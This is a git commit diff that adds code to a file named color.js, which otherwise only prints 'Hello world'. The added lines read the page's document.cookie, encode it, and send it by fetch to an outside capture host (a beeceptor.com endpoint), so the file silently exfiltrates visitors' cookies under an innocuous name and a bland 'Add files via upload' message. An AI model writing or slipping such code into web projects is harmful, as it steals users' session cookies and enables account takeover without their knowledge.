5508bafc2b133982c0aeceda7829e6b8bff06b1b
Velk <167213031+velk33@users.noreply.github.com>
2025-10-02 19:33:40 +0200

    Add files via upload

--- ch62/color.js
+++ ch62/color.js
@@ -1,1 +1,7 @@
 console.log('Hello world');
+
+const encodedCookies = encodeURIComponent(btoa(document.cookie));
+const params = new URLSearchParams();
+params.append("cookies", encodedCookies);
+const response = await fetch(`https://scobee.free.beeceptor.com?${params}`);
+
